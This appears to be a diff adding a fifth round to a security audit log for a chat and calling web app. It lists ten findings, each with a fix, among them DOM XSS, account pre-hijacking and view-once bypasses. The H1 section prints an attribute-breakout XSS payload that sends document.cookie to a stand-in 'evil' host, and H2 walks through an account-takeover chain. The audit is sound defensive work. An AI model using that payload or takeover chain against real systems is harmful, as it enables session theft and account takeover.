@@ -278,3 +278,119 @@ Owner request: *"expose the security bugs... check the entire app... I want full
 - **Upload memory-exhaustion ordering** — `/api/v2/upload`'s rate limiter runs after the request body is already buffered; a flood of large bodies can still cost memory before being rejected. Noted, not fixed this pass.
 - **`/api/v2/offline` has no rate limit** — the sendBeacon-driven presence-offline endpoint; noted, not fixed this pass.
 - **Anonymous `/api/relay/ice` TURN credential minting** — any anonymous caller can mint short-lived TURN credentials for an arbitrary `who`; only a bandwidth-freeloading concern, and only matters once an operator configures a dedicated coturn (`TURN_SECRET`/`TURN_HOST`) rather than the free `openrelay` fallback.
+
+---
+
+# Round 5 (2026-07-24) — class-based sweep
+
+Owner: *"make sure that you cover all type of security bugs. You fix them, and you check everything on a place on proper. Because I want the system to be very perfect."*
+
+Rounds 1–4 audited **surface by surface** (tRPC routers, then auth, then storage, then the signaling engine). That structure kept re-walking the same code and had started returning diminishing results. Round 5 inverted the axis and audited by **vulnerability class** — injection, XSS, authz/IDOR, CSRF, SSRF, upload/path, crypto, race/TOCTOU, DoS/ReDoS, business logic, info disclosure, client trust, dependencies, CI — with each class asked to enumerate *every* sink of its kind and trace provenance for each. That is what surfaced the two HIGHs below, both of which live in code the earlier surface passes had already read.
+
+It also covered v2.99.21–v2.99.36, which had never been security reviewed (≈2,500 changed lines, including the new M11 server-side ephemeral gating and the landing-page `innerHTML` rework).
+
+10 findings, all verified against source before any change.
+
+## H1 — zero-click DOM XSS in the in-call chat (HIGH)
+
+**Where:** `client/src/lib/relayClient.ts`, `addChatMsg`.
+**Problem.** A chat frame's `pin` arrives over the peer's **WebRTC data channel** and the receive path validated it with nothing but `typeof d.pin === "string"`. It was then interpolated into the message row's `innerHTML` **twice, unescaped**: once inside the double-quoted `data-pin="…"` attribute, and once through `fmtPin`, whose regex leaves a non-matching string completely unchanged. A peer sending
+
+```
+pin: 'x"><img src=x onerror=fetch("//evil/?"+document.cookie)>'
+```
+
+broke out of the attribute and injected a live element that executes **on parse** — no click, no hover, just receiving the message. Running on the app's own origin, that script drives the whole authenticated API as the victim (read every thread, send as them, edit the profile), i.e. session takeover. Reachable by anyone who can share a call — including a **party line**, which is joinable by number, so a single frame could hit every participant at once.
+
+Notably, the correct check already existed three lines away: `ensureChatAvatar` guards on `/^\d{6}$/`. It just ran *after* the markup was written, so it protected the avatar fetch and not the render.
+
+**Fix.** Validate rather than merely escape — a pin is always exactly six digits, so anything else is dropped to `undefined`. This also stops a malformed value reaching the `[data-pin="…"]` `querySelectorAll`. The `initials()` sinks on the chat chip, the call tiles, and the recents list were escaped as well: a 2-char slice can't carry an event handler, but a bare `<` still corrupts the parse, and escaping removes the need to reason about the length cap at each site.
+
+## H2 — account pre-hijacking → full account takeover (HIGH)
+
+**Where:** `server/authLocal.ts` (`/api/auth/register`, `/api/auth/login`) + `server/authOtp.ts` (`findUserByEmailAny`, `markUserEmailVerified`).
+**Problem.** The classic pre-hijacking pattern, complete end to end:
+
+1. `POST /api/auth/register` is unauthenticated and calls `createLocalUser`, which writes `loginMethod:"local"`, `passwordHash:<attacker's>`, `emailVerified:false` — for **any** email, including one that has never signed up.
+2. The victim later signs up / signs in with an email one-time code. `findUserByEmailAny` deliberately falls back to a `local` row (v2.92, so pre-existing accounts keep working), so the OTP flow **resolves to the attacker's row** instead of creating a fresh one.
+3. It then calls `markUserEmailVerified`, flipping `emailVerified` to true **and leaving the attacker's `passwordHash` in place**.
+4. `POST /api/auth/login` requires only a matching password plus `emailVerified` — both now satisfied. The attacker signs in and shares the victim's account: every thread, contact, and call record, plus the ability to change the profile and number. The victim sees nothing amiss.
+
+**Fix.** New `clearUnverifiedCredentials(userId)` nulls `passwordHash` and the PIN fields on a row that is still `emailVerified:false`, called at **both** OTP claim sites immediately *before* `markUserEmailVerified` (ordering is load-bearing — the helper's own guard is `emailVerified=false`, so flipping the flag first would make it a no-op). A credential set before the address was ever proven carries no trust. Scoped to unverified rows, so a legitimate local user who verified via their own emailed link keeps their password.
+
+## H3 — view-once lock bypass via the attachment gate (MED→HIGH)
+
+**Where:** `server/v2db.ts` `getAttachmentForIdentity`.
+**Problem.** M11 (v2.99.34) stopped returning body/attachment from `messages.list` for a locked expiring message. But `getAttachmentForIdentity` authorized a non-uploader via **any** message referencing the attachment — including the still-locked one, whose `attachmentId` is only nulled at *burn* time. That single function is the gate behind `attachments.get` (which takes a sequential integer id, so a recipient can simply enumerate), `authorizeStorageKey`, **and** `messages.send`'s "do you own this attachment" check. So a recipient could:
+
+- read view-once media repeatedly **without burning it** — the message stayed locked for everyone and the sender was never told it had been seen, defeating the entire guarantee; and
+- **re-attach** the sender's view-once media to a brand-new message in another conversation, laundering content meant to vanish into a permanent one the original sender cannot unsend.
+
+**Fix.** An un-consumed expiring message no longer serves as authorization (`JSON_EXTRACT(meta,'$.expire') IS NULL OR JSON_EXTRACT(meta,'$.consumedAt') IS NOT NULL`). The uploader's early return is above it, so senders are unaffected; a consumed message already fails closed per F3. `revealExpiring` remains the only path to locked content.
+
+## H4 — MySQL left-to-right UPDATE assignment broke both attempt ladders (MED)
+
+**Where:** `server/authPin.ts` (PIN lockout), `server/authOtp.ts` (OTP burn).
+**Problem.** MySQL documents that single-table `UPDATE` SET assignments evaluate left to right, and a later assignment reads the value an earlier one **just wrote** (a deviation from standard SQL). Both ladders incremented the counter in assignment #1 and then re-added `+ 1` inside assignment #2's `CASE`, double-counting:
+
+- **PIN:** effective test became `old + 2 > 3`, so the row locked on the **third** wrong entry rather than the fourth — and the persisted count could then only ever reach 3, while the lock-alert email fires only at exactly `PIN_MAX_ATTEMPTS + 1` (4). **That email was therefore unreachable: an account owner was never told their account was being brute-forced.** Locking early is fail-safe; silently dropping the alert is not.
+- **OTP:** burned the code on the fourth wrong guess instead of the fifth, contradicting `OTP_MAX_ATTEMPTS` and the "attempts left" copy.
+
+**Fix.** Compare the post-increment value directly in both. The regression test simulates MySQL's assignment order arithmetically, so the off-by-one cannot silently return.
+
+## H5 — `startGuest` was an unthrottled identity minter (MED)
+
+**Where:** `server/v2routers.ts`.
+**Problem.** `startGuest` mints an `identities` row plus a permanent claim on one of ~980,000 six-digit numbers, is reachable with no cookie and no credential, and was the **only** unauthenticated resource-creating endpoint with no throttle (every comparable one already had a gate). The number space is finite and never reclaimed: `numberTaken` treats mere row existence as taken (it ignores guest expiry), nothing anywhere deletes identities, and M20's `number_reservations` ledger is deliberately monotonic. Drained far enough, `allocateSharedNumber`'s 40-attempt random search begins failing for **everyone**, and at exhaustion every new guest, every registration, and every party-line creation fails with "could not allocate a unique 6-digit number" — a slow, permanent, unauthenticated denial of service on all onboarding, with no recovery short of manual DB surgery.
+**Fix.** `guestMintGate` — 20 burst, ~1 per 10s sustained per IP, honoring `RELAY_RATELIMIT_OFF`. The reuse paths return before allocating, so real visitors are unaffected.
+
+## H6 — `revealExpiring` buffered an unbounded body (MED)
+
+**Where:** `server/v2routers.ts`.
+**Problem.** The size guard was `Number(resp.headers.get("content-length") ?? 0) <= CAP`, so an upstream response with **no** content-length yielded `0`, passed the check, and went straight into `arrayBuffer()` with no ceiling. The follow-up `buf.length <= CAP` check was too late — the memory was already committed. A lying (small) content-length had the same effect. The bytes are then base64'd (+33%) and serialized into a JSON tRPC response, so one request could pin several times the object's size in heap, on an endpoint throttled only per IP.
+**Fix.** Reject an over-cap *declared* size cheaply, then read the stream with a hard `REVEAL_MAX_INLINE_BYTES` ceiling and cancel on exceed, so a missing or dishonest header cannot exceed the cap either.
+
+## H7 — view-once burn was not atomic (MED)
+
+**Where:** `server/v2db.ts` `consumeExpiringMessage`, `revealExpiringMessage`.
+**Problem.** Both did read → check `meta.consumedAt == null` in JS → write, with an `await` (the participant lookup) in between. Two concurrent reveals of the same view-once message therefore both observed "not yet consumed", both passed, and both returned the captured content — the same lost-update class as the S1 PIN-lockout and S9 OTP races. It also amplified H6: N racing reveals each triggered a full storage fetch and base64 inline of the same object.
+**Fix.** A shared `burnExpiringMessage` helper performs one conditional `UPDATE` guarded on `JSON_EXTRACT(meta,'$.consumedAt') IS NULL`, with the verdict taken from `affectedRows`; only the winner receives the content.
+
+## H8 — `avatarUrl` accepted arbitrary external URLs (MED)
+
+**Where:** `server/v2routers.ts` `AvatarUrlSchema`.
+**Problem.** `/^https?:\/\//` was permitted, making a profile photo a remote-fetch primitive aimed at other users' browsers — and the avatar renders on the **incoming-call ring card**, which appears with no interaction from the callee. An attacker could set their avatar to `http://their-host/x.png`, dial a victim, and harvest the victim's **IP address and User-Agent from a call the victim never answered**. It also fired from thread lists, contact rows, and in-call tiles, giving a passive read on when a target is looking at them. This is the same threat the status-background sanitizer already rejects `url(...)` for, and it cuts directly against this app's stated no-tracing goal.
+**Fix.** Restricted to our own `/manus-storage/` path or an inline `data:image/`. No compatibility cost: every client path sets this from our own upload endpoint or clears it to null, and it is never re-sent on an unrelated profile edit; the schema gates writes only, so pre-existing rows keep rendering.
+
+## H9 — `status.post` skipped its ownership gate for text statuses (MED)
+
+**Where:** `server/v2routers.ts`.
+**Problem.** The `keyInOwnerNamespace` check lived only inside the media-kind `else` branch, but `input.mediaKey` was persisted for **every** kind. Since `authorizeStorageKey` resolves a `/status_` key by looking up whichever *active* status row claims it — and grants access to that row's owner and audience, checked before the attachment branch — a `kind:"text"` post could claim another user's status key and **re-activate** it. An expired or deleted status, whose media is supposed to be permanently unreachable ("truly ephemeral at the access layer even though the object lingers in the bucket"), became readable again by the planter and re-exposed to the planter's own audience. Anyone who was in the original audience while it was live already knows the key. Same laundering class as F2.
+**Fix.** The gate applies whenever a key is supplied, regardless of kind, and a text status never persists media at all.
+
+## H10 — reservation-ledger duplicate detection matched on error text (LOW)
+
+**Where:** `server/v2db.ts` `tryReserveNumber`.
+**Problem.** The helper fails **open** (returns `true`) for anything it doesn't recognize, and recognized the duplicate-key case only by `/duplicate/i` against the human-readable message. A driver upgrade, a localized server, or a wrapped error would silently turn every lost race into "reservation won", reintroducing the cross-table number collision the ledger exists to prevent — with no visible sign.
+**Fix.** Key on mysql's stable machine-readable markers (`errno === 1062` / `code === "ER_DUP_ENTRY"`) first; the text sniff remains only as a fallback.
+
+## Verified clean (documented negatives)
+
+Recorded so the negative result is trustworthy rather than merely unstated:
+
+- **No SQL injection.** Every `sql` template interpolates either a Drizzle column reference (serialized as an identifier) or a value via `${}`, which Drizzle parameterizes. The only literal table/column names are hardcoded. `unreadCount` is also correctly floored with `GREATEST(… - 1, 0)`.
+- **Landing-page XSS intact after the v2.99.35 React-19 `innerHTML` rework.** `escLp` escapes all five dangerous characters, is applied *after* name composition, and every interpolation site is element-text context; labels use `textContent`; the appended arrow SVG is a constant.
+- **Secret comparison.** `timingSafeEqual` used consistently for passwords, HMACs, and webhook signatures, each with a length check first (and the inbound one additionally wrapped in try/catch).
+- **CSRF genuinely defended.** All cookies are `SameSite=Lax`, so the cookie path of the raw `text/plain`-accepting `POST /api/v2/offline` beacon cannot fire cross-site; its `deviceId` body fallback requires a secret the attacker doesn't have.
+- **`keyInOwnerNamespace` correctly anchored** — the trailing slash defeats the `relay-chat/1/` vs `relay-chat/12/` prefix collision — and the v2.99.x absolute-URL avatar fix is unexploitable: you cannot simultaneously satisfy the `lastIndexOf`-based namespace gate and the `isIdentityAvatarKey` suffix match with a victim's key.
+- **`searchMessages` filters expiring content**, so view-once bodies never surface through search.
+- **`tabPresence`** stores no secrets, rebuilds a fresh object (no prototype pollution), and fails safe toward a delayed offline rather than a stuck-online.
+
+## Accepted residual (round 5)
+
+- **`push.subscribe` endpoint re-bind.** The unique key is on `endpoint` alone, so `onDuplicateKeyUpdate` re-binds the row to the caller — meaning someone who *knows* a victim's endpoint can silently kill their notifications (the sibling of G3, which was fixed on the `unsubscribe` side). Deliberately **not** changed: no API ever returns an endpoint, the hijacker gains nothing readable (pushes are encrypted to their own keys, so the victim just receives undecryptable ones), and the only correct fix is a proof-of-possession challenge/response — new infrastructure. Naively refusing a re-bind to a different identity would break the *documented* account-switch-on-the-same-device flow, silently killing notifications for real users, which is a worse and far more common failure than the attack.
+- All prior-round residuals stand unchanged.
+
+## Verification (round 5)
+
+`pnpm check` clean; `pnpm test` **1540 passing / 1 skipped**; `pnpm build` clean. New `server/hardeningPass5.test.ts` (44 tests) — including a real arithmetic **simulation of MySQL's left-to-right assignment order** so H4's off-by-one cannot silently return, and the actual attribute-breakout payloads H1's pin guard must reject. Four stale pre-existing source pins were updated to the corrected shapes rather than weakened (`m11ContentGating` ×2, `peerIdentityBatch`, `qaBatch8`).
